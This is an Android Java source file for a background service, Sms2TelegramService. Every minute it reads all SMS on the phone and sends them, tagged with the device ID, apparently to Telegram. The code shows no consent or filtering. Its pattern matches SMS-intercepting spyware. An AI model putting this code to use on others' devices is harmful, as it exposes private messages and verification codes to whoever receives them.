/**
 * Copyright (C) 2023 DESMG
 * All Rights Reserved.
 */

package com.desmg.utility;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import java.util.Objects;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.disposables.Disposable;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class Sms2TelegramService extends Service {
    Context ctx;
    private Disposable disposable = null;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ctx = getApplicationContext();
        try {
            disposable = Observable.interval(60, TimeUnit.SECONDS).subscribeOn(Schedulers.newThread()).subscribe(count -> new Sms2TelegramTicker().run());
        } catch (Exception e) {
            Toast.makeText(ctx, e.getMessage(), Toast.LENGTH_LONG).show();
        }
        return Service.START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (disposable != null) {
                if (!disposable.isDisposed()) {
                    disposable.dispose();
                    disposable = null;
                }
            }
        } catch (Exception e) {
            Log.e("ERROR", Objects.requireNonNull(e.getMessage()));
        }
    }

    @SuppressLint("HardwareIds")
    private String getDeviceId() {
        return Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private class Sms2TelegramTicker {
        public void run() {
            String sms = SmsHelper.getAllSms(ctx);
            Sms2Telegram.sendJson(getDeviceId(), Objects.requireNonNullElse(sms, "{}"));
        }
    }
}